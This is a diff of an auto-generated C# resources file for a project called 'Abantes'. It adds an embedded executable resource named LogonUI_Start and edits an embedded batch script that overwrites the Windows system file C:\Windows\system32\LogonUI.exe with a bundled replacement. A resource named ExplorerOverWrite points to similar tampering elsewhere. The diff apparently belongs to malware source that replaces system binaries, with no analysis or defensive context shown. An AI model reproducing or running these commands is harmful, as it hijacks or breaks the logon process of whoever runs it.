@@ -94,6 +94,15 @@ namespace Abantes.Properties {
         }
         
         /// <summary>
+        ///   Looks up a localized string similar to .
+        /// </summary>
+        internal static string ExplorerOverWrite {
+            get {
+                return ResourceManager.GetString("ExplorerOverWrite", resourceCulture);
+            }
+        }
+        
+        /// <summary>
         ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
         internal static byte[] icon {
@@ -106,12 +115,22 @@ namespace Abantes.Properties {
         /// <summary>
         ///   Looks up a localized string similar to @echo on
         ///cd\
-        ///copy %temp%\LogonUIStart.exe &quot;C:\Windows\system32\LogonUI.exe&quot; /Y
+        ///copy &quot;C:\Windows\Defender\LogonUIStart.exe&quot; &quot;C:\Windows\system32\LogonUI.exe&quot; /Y
         ///copy %temp%\LogonUi.exe &quot;C:\Windows\Temp\LogonUi.exe&quot; /Y.
         /// </summary>
         internal static string LogonOverwrite {
             get {
                 return ResourceManager.GetString("LogonOverwrite", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] LogonUI_Start {
+            get {
+                object obj = ResourceManager.GetObject("LogonUI_Start", resourceCulture);
+                return ((byte[])(obj));
             }
         }
     }
